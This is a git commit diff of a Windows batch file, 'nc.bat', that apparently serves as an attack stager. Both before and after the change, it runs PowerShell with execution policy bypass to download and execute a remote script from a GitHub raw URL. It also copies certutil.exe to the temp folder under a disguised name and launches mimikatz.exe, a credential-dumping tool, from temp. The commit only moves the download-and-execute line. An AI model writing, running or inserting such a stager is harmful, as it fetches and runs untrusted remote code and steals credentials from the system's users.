e7ae58fbd854e35e83bf556c8fb0398a45097b71
inwestallis <inwestallis@gmail.com>
2020-04-24 15:35:53 +0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -1,11 +1,8 @@
 @echo on
-start cmd.exe
-powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
+
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
-
-
-
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
 
 start %temp%\mimikatz.exe
 
